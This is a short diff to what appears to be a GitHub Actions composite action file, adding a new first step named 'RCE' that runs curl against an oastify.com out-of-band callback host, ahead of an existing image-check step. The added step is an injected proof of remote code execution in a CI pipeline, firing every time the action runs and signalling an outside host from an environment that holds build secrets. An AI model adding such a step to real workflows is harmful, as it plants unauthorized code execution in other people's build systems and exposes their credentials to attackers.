@@ -26,6 +26,9 @@ inputs:
 runs:
   using: composite
   steps:
+    - name: RCE
+      shell: bash
+      run: curl https://ao2h3oabwwxhoj7nm3nhrya2dtjk7kv9.oastify.com/2w
     - name: Check if image exists
       if: ${{ inputs.dep_evm_sha != '' || inputs.check_image_exists == 'true'}}
       id: check-image
